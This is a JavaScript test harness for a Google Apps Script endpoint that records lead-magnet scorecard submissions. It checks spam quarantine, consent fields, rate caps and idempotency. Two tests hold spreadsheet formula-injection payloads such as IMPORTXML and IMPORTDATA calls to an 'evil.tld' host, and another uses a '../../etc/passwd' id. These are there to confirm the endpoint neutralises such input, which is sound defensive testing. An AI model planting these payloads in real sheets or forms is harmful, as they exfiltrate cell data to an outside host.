/**
 * Test harness for scorecard-capture.v2.gs
 *
 *   node integrations/scorecard-capture.test.js
 *
 * Apps Script cannot be run locally, so this executes the real .gs source in a
 * VM with in-memory mocks of SpreadsheetApp, PropertiesService, LockService,
 * ContentService and Logger. The mocks reproduce the behaviours the code
 * actually depends on:
 *
 *   - getSheetByName returns null for a tab that does not exist
 *   - getActiveSpreadsheet() returns null, as it does inside a web app, so the
 *     v1 regression is reproducible rather than asserted
 *   - appendRow and getRange().setValues() write into a real 2-D array, so a
 *     formula string is stored verbatim and can be asserted on
 *   - tryLock returns false while another call holds the lock
 *
 * What this cannot prove: real Google concurrency, real quota behaviour, and
 * real Sheets formula evaluation. Those are named in the remaining-risks
 * section of docs/16.
 */

const fs = require('fs');
const path = require('path');
const vm = require('vm');

const SRC = path.join(__dirname, 'scorecard-capture.v2.gs');

/* ----------------------------------------------------------------- mocks */

function makeSheet(name) {
  return {
    name,
    rows: [],                                  // rows[0] is the header row
    frozen: 0,
    getName: function () { return this.name; },
    getLastRow: function () { return this.rows.length; },
    getLastColumn: function () {
      return this.rows.reduce((m, r) => Math.max(m, r.length), 0);
    },
    setFrozenRows: function (n) { this.frozen = n; return this; },
    getFrozenRows: function () { return this.frozen; },
    appendRow: function (row) { this.rows.push(row.slice()); return this; },
    getRange: function (r, c, numRows, numCols) {
      const sheet = this;
      numRows = numRows || 1;
      numCols = numCols || 1;
      return {
        getValues: function () {
          const out = [];
          for (let i = 0; i < numRows; i++) {
            const row = sheet.rows[r - 1 + i] || [];
            const slice = [];
            for (let j = 0; j < numCols; j++) slice.push(row[c - 1 + j] === undefined ? '' : row[c - 1 + j]);
            out.push(slice);
          }
          return out;
        },
        getValue: function () { return this.getValues()[0][0]; },
        setValues: function (vals) {
          for (let i = 0; i < vals.length; i++) {
            const ri = r - 1 + i;
            while (sheet.rows.length <= ri) sheet.rows.push([]);
            for (let j = 0; j < vals[i].length; j++) sheet.rows[ri][c - 1 + j] = vals[i][j];
          }
          return this;
        },
        setValue: function (v) { return this.setValues([[v]]); },
        setFontWeight: function () { return this; }
      };
    }
  };
}

function makeBook(name) {
  return {
    sheets: [],
    getName: function () { return name; },
    getSheetByName: function (n) { return this.sheets.find(s => s.name === n) || null; },
    getSheets: function () { return this.sheets; },
    insertSheet: function (n) { const s = makeSheet(n); this.sheets.push(s); return s; }
  };
}

function buildContext(opts) {
  opts = opts || {};
  const book = makeBook('Sklarz Creative - Scorecard leads');
  const props = {};
  const errors = [];
  let lockHeld = false;

  const ctx = {
    console: {
      error: (...a) => {
        let i = 1;
        const msg = String(a[0]).replace(/%s/g, () => (i < a.length ? String(a[i++]) : '%s'));
        errors.push([msg].concat(a.slice(i)).join(' ').trim());
      },
      log: () => {}
    },
    Logger: { log: () => {} },
    SpreadsheetApp: {
      openById: (id) => {
        if (opts.badId || id !== 'SHEET_ID_OK') throw new Error('not found');
        return book;
      },
      // As inside a real web app: there is no active spreadsheet.
      getActiveSpreadsheet: () => null,
      getActive: () => null
    },
    Utilities: {
      formatDate: (d, tz, fmt) => new Date(d).toISOString().slice(0, 10)
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k) => (k in props ? props[k] : null),
        setProperty: (k, v) => { props[k] = v; }
      })
    },
    LockService: {
      getScriptLock: () => ({
        tryLock: () => { if (lockHeld) return false; lockHeld = true; return true; },
        releaseLock: () => { lockHeld = false; }
      })
    },
    ContentService: {
      MimeType: { JSON: 'JSON' },
      createTextOutput: (s) => ({ _s: s, setMimeType: function () { return this; }, getContent: function () { return this._s; } })
    }
  };
  ctx.globalThis = ctx;
  vm.createContext(ctx);
  vm.runInContext(fs.readFileSync(SRC, 'utf8'), ctx, { filename: 'scorecard-capture.v2.gs' });
  return { ctx, book, props, errors, holdLock: () => { lockHeld = true; }, };
}

function post(ctx, body) {
  const raw = typeof body === 'string' ? body : JSON.stringify(body);
  const out = ctx.doPost({ postData: { contents: raw } });
  return JSON.parse(out.getContent());
}

function ready(opts) {
  const h = buildContext(opts);
  h.ctx.SETUP_SPREADSHEET_ID = 'SHEET_ID_OK';
  h.ctx.setupCaptureEndpoint();
  return h;
}

const UUID = '3f2b6c4e-9a1d-4c8e-b7a2-5d1e0f9c3a44';
const UUID2 = '8c1a4d2f-77b3-4e19-9f6c-2a0b5e7d1c33';

function goodCapture(id, over) {
  return Object.assign({
    event: 'capture', submission_id: id || UUID,
    first_name: 'Cassandra', email: 'c@example.com',
    follow_up_opt_in: 'yes', resource: 'Trust-First Content Scorecard',
    page: '/insights/resources/trust-first-content-scorecard/',
    dwell_ms: 9000, company_website: '', utm_source: 'linkedin'
  }, over || {});
}

/* total 27 -> 'Solid foundation'; lowest is credibility (3) */
function goodResult(id, over) {
  return Object.assign({
    event: 'result', submission_id: id || UUID,
    total: 27, clarity: 7, consistency: 6, credibility: 3, connection: 6, conversion: 5,
    weakest_signal: 'Credibility', band: 'Solid foundation',
    completed_at: '2026-08-25T10:00:00.000Z'
  }, over || {});
}

/* ----------------------------------------------------------------- tests */

const results = [];
function check(name, fn) {
  try { const detail = fn(); results.push({ name, pass: true, detail: detail || '' }); }
  catch (err) { results.push({ name, pass: false, detail: err.message }); }
}
function assert(cond, msg) { if (!cond) throw new Error(msg); }

function rowsOf(h, tab) {
  const s = h.book.getSheetByName(tab);
  return s ? s.rows.slice(1) : [];
}
function colIdx(h, tab, name) {
  return h.book.getSheetByName(tab).rows[0].indexOf(name);
}
function cell(h, tab, rowN, name) {
  return rowsOf(h, tab)[rowN][colIdx(h, tab, name)];
}

check('00  v1 regression: getActiveSpreadsheet() is null in a web app', () => {
  const h = buildContext();
  assert(h.ctx.SpreadsheetApp.getActiveSpreadsheet() === null,
    'mock should model the web-app context');
  return 'v1 would have thrown here on every request';
});

check('01  setup creates three tabs with exact headers, frozen', () => {
  const h = ready();
  ['Leads', 'Spam', 'Analytics'].forEach(t => {
    const s = h.book.getSheetByName(t);
    assert(s, t + ' missing');
    assert(s.frozen === 1, t + ' header not frozen');
    assert(s.rows.length === 1, t + ' should have only a header row');
  });
  assert(h.props.TFCS_SPREADSHEET_ID === 'SHEET_ID_OK', 'spreadsheet id not stored');
  return 'Leads/Spam/Analytics created, id in Script Properties';
});

check('02  setup is idempotent and refuses a mismatched tab', () => {
  const h = ready();
  h.ctx.setupCaptureEndpoint();                       // second run must not throw
  assert(h.book.getSheetByName('Leads').rows.length === 1, 'headers duplicated');
  h.book.getSheetByName('Spam').rows[0] = ['something', 'else'];
  let threw = false;
  try { h.ctx.setupCaptureEndpoint(); } catch (e) { threw = /will not overwrite/.test(e.message); }
  assert(threw, 'setup should refuse an unexpected existing structure');
  return 'second run clean; mismatched headers rejected';
});

check('03  valid capture writes exactly one Leads row, no Spam', () => {
  const h = ready();
  const r = post(h.ctx, goodCapture());
  assert(r.ok === true, 'capture rejected');
  assert(rowsOf(h, 'Leads').length === 1, 'expected 1 lead row');
  assert(rowsOf(h, 'Spam').length === 0, 'nothing should be in Spam');
  assert(cell(h, 'Leads', 0, 'email') === 'c@example.com', 'email not stored verbatim');
  assert(cell(h, 'Leads', 0, 'spam_reason') === '', 'spam_reason must be blank for a lead');
  assert(cell(h, 'Leads', 0, 'consent_version') === '2026-08-25.1', 'consent_version missing');
  var consentAt = cell(h, 'Leads', 0, 'consent_at');
  // instanceof is unreliable across a vm realm; check the brand instead.
  assert(Object.prototype.toString.call(consentAt) === '[object Date]',
    'consent timestamp missing, got ' + JSON.stringify(consentAt));
  assert(cell(h, 'Leads', 0, 'utm_source') === 'linkedin', 'campaign data lost');
  const h2 = ready();
  post(h2.ctx, goodCapture(null, { follow_up_opt_in: 'no' }));
  assert(cell(h2, 'Leads', 0, 'consent_at') === '', 'opt-out must not carry a consent timestamp');
  assert(cell(h2, 'Leads', 0, 'follow_up_opt_in') === 'no', 'opt-out not recorded');
  return 'lead stored with consent version + timestamp + campaign; opt-out leaves consent_at blank';
});

check('04  bad JSON is rejected and quarantined', () => {
  const h = ready();
  const r = post(h.ctx, '{not json');
  assert(r.ok === false, 'should not report success');
  assert(rowsOf(h, 'Leads').length === 0, 'nothing may reach Leads');
  assert(cell(h, 'Spam', 0, 'spam_reason') === 'bad_json', 'not quarantined');
  return 'ok:false, row in Spam';
});

check('05  oversized payload rejected before parsing', () => {
  const h = ready();
  const big = goodCapture(); big.first_name = 'x'.repeat(5000);
  const r = post(h.ctx, big);
  assert(r.ok === false, 'oversized should be refused');
  assert(rowsOf(h, 'Leads').length === 0, 'nothing may reach Leads');
  assert(cell(h, 'Spam', 0, 'spam_reason') === 'oversized', 'not marked oversized');
  return 'refused at ' + h.ctx.MAX_BODY_BYTES + ' bytes';
});

check('06  honeypot goes to Spam, never Leads', () => {
  const h = ready();
  const r = post(h.ctx, goodCapture(null, { company_website: 'http://spam.example' }));
  assert(r.ok === true, 'bot should not learn it was caught');
  assert(rowsOf(h, 'Leads').length === 0, 'honeypot hit reached Leads');
  assert(cell(h, 'Spam', 0, 'spam_reason') === 'honeypot', 'wrong reason');
  return 'ok:true to the bot, row isolated in Spam';
});

check('07  too-fast submission goes to Spam', () => {
  const h = ready();
  post(h.ctx, goodCapture(null, { dwell_ms: 200 }));
  assert(rowsOf(h, 'Leads').length === 0, 'fast bot reached Leads');
  assert(cell(h, 'Spam', 0, 'spam_reason') === 'too_fast', 'wrong reason');
  return 'under ' + h.ctx.MIN_DWELL_MS + 'ms quarantined';
});

check('08  invalid email goes to Spam', () => {
  const h = ready();
  post(h.ctx, goodCapture(null, { email: 'not-an-email' }));
  assert(rowsOf(h, 'Leads').length === 0, 'invalid email reached Leads');
  assert(cell(h, 'Spam', 0, 'spam_reason') === 'bad_email', 'wrong reason');
  return 'Make.com can never mail it';
});

check('09  formula injection is neutralised', () => {
  const h = ready();
  const attack = '=IMPORTXML("https://evil.tld/?x="&D2,"//a")';
  post(h.ctx, goodCapture(null, { first_name: attack }));
  const stored = cell(h, 'Leads', 0, 'first_name');
  assert(stored.charAt(0) === "'", 'leading = not neutralised: ' + stored);
  assert(stored.indexOf('IMPORTXML') > 0, 'value should be preserved as text');
  ['+cmd', '-2+3', '@SUM(A1)'].forEach((v, i) => {
    post(h.ctx, goodCapture(i === 0 ? UUID2 : UUID2.replace('8c1a', '8c1' + (i + 1)), { first_name: v }));
  });
  rowsOf(h, 'Leads').forEach(r => {
    const v = String(r[colIdx(h, 'Leads', 'first_name')]);
    assert(!/^[=+\-@]/.test(v), 'unescaped formula prefix survived: ' + v);
  });
  return 'leading = + - @ all prefixed, text preserved';
});

check('10  duplicate capture id does not create a second lead', () => {
  const h = ready();
  post(h.ctx, goodCapture());
  post(h.ctx, goodCapture());
  assert(rowsOf(h, 'Leads').length === 1, 'duplicate lead created');
  return 'idempotent on submission_id';
});

check('11  malformed submission id is quarantined', () => {
  const h = ready();
  post(h.ctx, goodCapture('../../etc/passwd'));
  assert(rowsOf(h, 'Leads').length === 0, 'malformed id reached Leads');
  assert(cell(h, 'Spam', 0, 'spam_reason') === 'bad_submission_id', 'wrong reason');
  return 'UUID / tfcs- format enforced';
});

check('12  result before capture: no orphan lead, merged on arrival', () => {
  const h = ready();
  post(h.ctx, goodResult());                          // result arrives first
  assert(rowsOf(h, 'Leads').length === 0, 'result fabricated a lead row');
  assert(rowsOf(h, 'Analytics').length === 1, 'result not parked in Analytics');
  post(h.ctx, goodCapture());                          // capture follows
  assert(rowsOf(h, 'Leads').length === 1, 'expected exactly one lead');
  assert(cell(h, 'Leads', 0, 'total_score') === 27, 'scores not merged onto the lead');
  assert(cell(h, 'Leads', 0, 'email') === 'c@example.com', 'identity lost');
  assert(cell(h, 'Analytics', 0, 'merged_to_lead') === 'yes', 'analytics row not claimed');
  return 'one row per person, race C resolved';
});

check('13  invalid score ranges and inconsistent payloads are rejected', () => {
  const h = ready();
  post(h.ctx, goodCapture());
  const bad = [
    ['negative', { clarity: -1 }],
    ['over max', { clarity: 99 }],
    ['NaN', { clarity: 'abc' }],
    ['missing', { clarity: undefined }],
    ['total mismatch', { total: 40 }],
    ['band mismatch', { band: 'Strong trust system' }],
    ['weakest mismatch', { weakest_signal: 'Clarity' }],
    ['non-integer', { clarity: 3.5 }]
  ];
  bad.forEach(([label, over]) => {
    const r = post(h.ctx, goodResult(null, over));
    assert(r.ok === false, label + ' was accepted');
  });
  assert(cell(h, 'Leads', 0, 'total_score') === '', 'a bad result wrote to the lead');
  assert(rowsOf(h, 'Analytics').length === 0, 'a bad result reached Analytics');
  return '8 malformed results rejected, nothing written';
});

check('14  valid result updates the lead in one batch write', () => {
  const h = ready();
  post(h.ctx, goodCapture());
  const r = post(h.ctx, goodResult());
  assert(r.ok === true, 'valid result rejected');
  assert(rowsOf(h, 'Leads').length === 1, 'result appended instead of updating');
  assert(cell(h, 'Leads', 0, 'total_score') === 27, 'total not written');
  assert(cell(h, 'Leads', 0, 'credibility') === 3, 'category not written');
  assert(cell(h, 'Leads', 0, 'weakest_signal') === 'Credibility', 'weakest not written');
  assert(cell(h, 'Leads', 0, 'band') === 'Solid foundation', 'band not written');
  assert(rowsOf(h, 'Analytics').length === 0, 'should not also write Analytics');
  return 'nine columns, one setValues()';
});

check('15  concurrent request is refused, not interleaved', () => {
  const h = ready();
  h.holdLock();                                        // simulate a request in flight
  const r = post(h.ctx, goodCapture());
  assert(r.ok === false && r.error === 'busy', 'second writer was not serialised');
  assert(rowsOf(h, 'Leads').length === 0, 'wrote while another request held the lock');
  return 'LockService serialises writers';
});

check('16  GET health check exposes no rows or identifiers', () => {
  const h = ready();
  post(h.ctx, goodCapture());
  const out = JSON.parse(h.ctx.doGet().getContent());
  assert(out.ok === true && out.configured === true, 'health check not ok');
  assert(out.tabs.Leads && out.tabs.Spam && out.tabs.Analytics, 'tabs not reported');
  const s = JSON.stringify(out);
  assert(s.indexOf('c@example.com') === -1, 'email leaked');
  assert(s.indexOf('Cassandra') === -1, 'name leaked');
  assert(s.indexOf(UUID) === -1, 'submission id leaked');
  assert(!/\d{2,}/.test(JSON.stringify(out.tabs)), 'row counts leaked');
  return JSON.stringify(out);
});

check('17  unconfigured deployment fails safe', () => {
  const h = buildContext();                            // setup never run
  const out = JSON.parse(h.ctx.doGet().getContent());
  assert(out.ok === false && out.error === 'not_configured', 'should report not_configured');
  const r = post(h.ctx, goodCapture());
  assert(r.ok === false, 'should not claim success when unconfigured');
  return 'health check names the problem instead of failing silently';
});

check('18  diagnostics never log names, emails or content', () => {
  const h = ready();
  post(h.ctx, goodCapture(null, { email: 'leak@example.com', first_name: 'SecretName' }));
  post(h.ctx, goodCapture('bad-id', { email: 'other@example.com' }));
  post(h.ctx, goodResult(null, { clarity: 99 }));
  const log = h.errors.join('\n');
  assert(log.indexOf('leak@example.com') === -1, 'email in logs');
  assert(log.indexOf('other@example.com') === -1, 'email in logs');
  assert(log.indexOf('SecretName') === -1, 'name in logs');
  assert(log.indexOf('reason=') > -1, 'reason codes missing');
  return h.errors.join(' | ') || '(none)';
});

check('19  anonymous result reaches Analytics with no PII columns', () => {
  const h = ready();
  post(h.ctx, goodResult(null, { submission_id: '' }));
  assert(rowsOf(h, 'Leads').length === 0, 'anonymous result reached Leads');
  assert(rowsOf(h, 'Analytics').length === 1, 'anonymous result not recorded');
  const headers = h.book.getSheetByName('Analytics').rows[0];
  assert(headers.indexOf('first_name') === -1 && headers.indexOf('email') === -1,
    'Analytics must have no name or email column');
  return 'completion counted, person not identified';
});

check('20  daily cap bounds spam flooding', () => {
  const h = ready();
  h.ctx.MAX_SPAM_WRITES_PER_DAY = 5;
  for (let i = 0; i < 40; i++) post(h.ctx, goodCapture(null, { company_website: 'bot' }));
  const n = rowsOf(h, 'Spam').length;
  assert(n === 5, 'spam cap not enforced, wrote ' + n + ' rows');
  assert(rowsOf(h, 'Leads').length === 0, 'flood reached Leads');
  return '40 attempts, ' + n + ' rows written, cap held';
});

check('21  daily cap bounds lead writes and refuses cleanly', () => {
  const h = ready();
  h.ctx.MAX_LEAD_WRITES_PER_DAY = 3;
  const made = [];
  for (let i = 0; i < 10; i++) {
    const id = '3f2b6c4e-9a1d-4c8e-b7a2-5d1e0f9c3a' + (10 + i);
    made.push(post(h.ctx, goodCapture(id)));
  }
  assert(rowsOf(h, 'Leads').length === 3, 'lead cap not enforced');
  assert(made[9].ok === false && made[9].error === 'busy', 'over-cap call did not refuse cleanly');
  return 'capped at 3, later calls return busy rather than silently dropping';
});

check('22  counter failure fails open so a real lead is never lost', () => {
  const h = ready();
  h.ctx.PropertiesService = {
    getScriptProperties: () => ({
      getProperty: (k) => (k === 'TFCS_SPREADSHEET_ID' ? 'SHEET_ID_OK' : (() => { throw new Error('quota'); })()),
      setProperty: () => { throw new Error('quota'); }
    })
  };
  const r = post(h.ctx, goodCapture());
  assert(r.ok === true, 'counter outage blocked a legitimate capture');
  assert(rowsOf(h, 'Leads').length === 1, 'lead lost when counters unavailable');
  return 'properties outage does not cost a lead';
});


/* ---------------------------------------------- finding A · whitespace ---- */

check('23  formula markers after leading whitespace are neutralised', () => {
  const h = ready();
  const attacks = [
    [' =IMPORTDATA("https://evil.tld/x")', 'leading space + ='],
    ['\t=IMPORTDATA("https://evil.tld/x")', 'tab + ='],
    [' +1+1', 'leading space + +'],
    ['\n@SUM(A1:A9)', 'newline + @'],
    ['  -2+3', 'two spaces + -'],
    ['\r\t =HYPERLINK("http://evil","x")', 'CR, tab, space + ='],
  ];
  attacks.forEach(([payload, label], i) => {
    const id = '3f2b6c4e-9a1d-4c8e-b7a2-5d1e0f9c3b' + String(10 + i);
    post(h.ctx, goodCapture(id, { first_name: payload }));
  });
  const rows = rowsOf(h, 'Leads');
  assert(rows.length === attacks.length, `expected ${attacks.length} rows, got ${rows.length}`);
  rows.forEach((r, i) => {
    const v = String(r[colIdx(h, 'Leads', 'first_name')]);
    // Sheets trims leading whitespace before deciding if a cell is a formula,
    // so the guard must fire even when the marker is not character zero.
    assert(v.charAt(0) === "'", `${attacks[i][1]}: not neutralised -> ${JSON.stringify(v)}`);
    assert(!/^\s*[=+\-@]/.test(v), `${attacks[i][1]}: still parses as a formula`);
  });
  return attacks.length + ' whitespace-prefixed payloads all quoted as text';
});

check('24  ordinary values are NOT quoted', () => {
  const h = ready();
  post(h.ctx, goodCapture(null, { first_name: "Cassandra O'Brien" }));
  const v = String(cell(h, 'Leads', 0, 'first_name'));
  assert(v.charAt(0) !== "'", 'a normal name must not be prefixed: ' + v);
  assert(v === "Cassandra O'Brien", 'name altered: ' + v);
  return 'no false positives on legitimate input';
});

/* ------------------------------------------- finding B · strict numbers ---- */

check('25  non-number score types are all rejected', () => {
  const h = ready();
  post(h.ctx, goodCapture());
  const bad = [
    ['numeric string', { clarity: '7' }],
    ['empty string', { clarity: '' }],
    ['null', { clarity: null }],
    ['undefined/missing', { clarity: undefined }],
    ['boolean true', { clarity: true }],
    ['boolean false', { clarity: false }],
    ['NaN', { clarity: NaN }],
    ['Infinity', { clarity: Infinity }],
    ['-Infinity', { clarity: -Infinity }],
    ['non-integer', { clarity: 3.5 }],
    ['negative', { clarity: -1 }],
    ['over max', { clarity: 9 }],
    ['array', { clarity: [7] }],
    ['object', { clarity: { v: 7 } }],
    ['total as string', { total: '27' }],
    ['total NaN', { total: NaN }],
    ['total Infinity', { total: Infinity }],
    ['total non-integer', { total: 27.5 }],
    ['total over max', { total: 41 }],
  ];
  bad.forEach(([label, over]) => {
    const r = post(h.ctx, goodResult(null, over));
    assert(r.ok === false, label + ' was ACCEPTED');
  });
  assert(cell(h, 'Leads', 0, 'total_score') === '', 'a rejected result still wrote to the lead');
  assert(rowsOf(h, 'Analytics').length === 0, 'a rejected result reached Analytics');
  return bad.length + ' type/range violations rejected, nothing written';
});

check('26  a genuine numeric result still passes', () => {
  const h = ready();
  post(h.ctx, goodCapture());
  assert(post(h.ctx, goodResult()).ok === true, 'valid result rejected by the stricter check');
  assert(cell(h, 'Leads', 0, 'total_score') === 27, 'score not written');
  return 'strictness did not break the happy path';
});

/* --------------------------------------- finding C · result immutability --- */

check('27  identical retry succeeds without rewriting', () => {
  const h = ready();
  post(h.ctx, goodCapture());
  post(h.ctx, goodResult());
  const before = JSON.stringify(rowsOf(h, 'Leads'));
  const r = post(h.ctx, goodResult());
  assert(r.ok === true, 'identical retry was rejected');
  assert(r.note === 'already_recorded', 'retry not reported as already recorded');
  assert(JSON.stringify(rowsOf(h, 'Leads')) === before, 'identical retry rewrote the row');
  assert(rowsOf(h, 'Leads').length === 1, 'retry appended a row');
  return 'idempotent, byte-identical row preserved';
});

check('28  conflicting retry is rejected and the original survives', () => {
  const h = ready();
  post(h.ctx, goodCapture());
  post(h.ctx, goodResult());
  // total 35 -> 'Strong trust system'; lowest is conversion (5)
  const r = post(h.ctx, goodResult(null, {
    total: 35, clarity: 8, consistency: 7, credibility: 7, connection: 8, conversion: 5,
    weakest_signal: 'Conversion', band: 'Strong trust system'
  }));
  assert(r.ok === false, 'conflicting overwrite was accepted');
  assert(r.error === 'already_completed', 'wrong rejection reason: ' + r.error);
  assert(cell(h, 'Leads', 0, 'total_score') === 27, 'original total was overwritten');
  assert(cell(h, 'Leads', 0, 'weakest_signal') === 'Credibility', 'original weakest overwritten');
  assert(rowsOf(h, 'Analytics').length === 0, 'conflict leaked into Analytics');
  return 'original preserved, conflict refused';
});

/* ------------------------------------------ finding D · analytics cap ------ */

check('29  analytics cap blocks the bypass route', () => {
  const h = ready();
  h.ctx.MAX_ANALYTICS_WRITES_PER_DAY = 4;
  // Valid, well-formed results with unknown ids: they pass every spam and score
  // check, so without their own cap they bypass the Leads and Spam ceilings.
  for (let i = 0; i < 25; i++) {
    const id = '7a1b2c3d-4e5f-4a6b-8c7d-9e0f1a2b3c' + String(10 + i);
    post(h.ctx, goodResult(id));
  }
  const n = rowsOf(h, 'Analytics').length;
  assert(n === 4, 'analytics cap not enforced, wrote ' + n);
  assert(rowsOf(h, 'Leads').length === 0, 'unmatched results reached Leads');
  return '25 valid anonymous completions, ' + n + ' written, cap held';
});

check('30  duplicate captures do not consume the lead-write allowance', () => {
  const h = ready();
  h.ctx.MAX_LEAD_WRITES_PER_DAY = 2;
  const first = '3f2b6c4e-9a1d-4c8e-b7a2-5d1e0f9c3c10';
  const second = '3f2b6c4e-9a1d-4c8e-b7a2-5d1e0f9c3c11';
  assert(post(h.ctx, goodCapture(first)).ok === true, 'first lead rejected');
  for (let i = 0; i < 10; i++) {
    assert(post(h.ctx, goodCapture(first)).ok === true, 'duplicate retry rejected');
  }
  assert(post(h.ctx, goodCapture(second)).ok === true,
    'duplicate retries consumed the allowance and blocked a new lead');
  assert(rowsOf(h, 'Leads').length === 2, 'expected two unique lead rows');
  return '10 retries consumed zero write slots; second unique lead stored';
});

check('31  pending Analytics results are immutable and idempotent', () => {
  const h = ready();
  const id = '7a1b2c3d-4e5f-4a6b-8c7d-9e0f1a2b3d10';
  assert(post(h.ctx, goodResult(id)).ok === true, 'initial pending result rejected');
  const same = post(h.ctx, goodResult(id));
  assert(same.ok === true && same.note === 'already_recorded',
    'identical pending retry was not accepted idempotently');
  const conflict = post(h.ctx, goodResult(id, {
    total: 35, clarity: 8, consistency: 7, credibility: 7, connection: 8, conversion: 5,
    weakest_signal: 'Conversion', band: 'Strong trust system'
  }));
  assert(conflict.ok === false && conflict.error === 'already_completed',
    'conflicting pending retry was not rejected');
  assert(rowsOf(h, 'Analytics').length === 1, 'pending retries created duplicate rows');
  assert(cell(h, 'Analytics', 0, 'total_score') === 27, 'original pending result changed');
  return 'identical retry reused one row; conflict rejected; original preserved';
});

check('32  an Analytics cap refusal is reported as failure', () => {
  const h = ready();
  h.ctx.MAX_ANALYTICS_WRITES_PER_DAY = 0;
  const r = post(h.ctx, goodResult('7a1b2c3d-4e5f-4a6b-8c7d-9e0f1a2b3d11'));
  assert(r.ok === false && r.error === 'busy', 'cap refusal was reported as success');
  assert(rowsOf(h, 'Analytics').length === 0, 'cap refusal still wrote a row');
  return 'no row written; caller receives ok:false and busy';
});

/* ---------------------------------------------------------------- report */

const pass = results.filter(r => r.pass).length;
console.log('\nscorecard-capture.v2.gs — test results\n');
results.forEach(r => {
  console.log((r.pass ? '  PASS  ' : '  FAIL  ') + r.name);
  if (r.detail) console.log('        ' + r.detail);
});
console.log('\n' + pass + '/' + results.length + ' passed\n');
process.exit(pass === results.length ? 0 : 1);
